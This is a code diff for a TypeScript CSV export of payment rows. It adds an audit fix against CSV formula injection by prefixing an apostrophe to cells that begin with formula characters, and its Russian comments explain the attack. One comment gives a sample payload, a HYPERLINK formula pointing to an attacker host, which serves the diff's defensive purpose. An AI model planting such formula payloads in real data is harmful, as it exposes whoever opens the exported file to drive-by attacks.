@@ -15,7 +15,16 @@ import { searchPayments, type PaymentRow } from '@/lib/db'
 
 function csvEscape(v: unknown): string {
   if (v === null || v === undefined) return ''
-  const s = String(v)
+  let s = String(v)
+  // Audit fix 2026-05-24: CSV Formula Injection (CWE-1236). Если значение
+  // начинается с `=`, `+`, `-`, `@`, TAB или CR — Excel/LibreOffice
+  // интерпретирует ячейку как формулу и **исполняет её при открытии файла**.
+  // Сценарий: юзер ставит first_name = `=HYPERLINK("http://evil.com")`,
+  // админ открывает payments_2026-05-25.csv → Excel выполняет → drive-by.
+  // Префикс апостроф нейтрализует это.
+  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
+    s = "'" + s
+  }
   // Экранирование по RFC 4180: значения с `,`, `"`, `\n`, `\r` оборачиваем в `"`
   // и удваиваем внутренние `"`. Все остальные значения оставляем как есть.
   if (/[",\r\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`
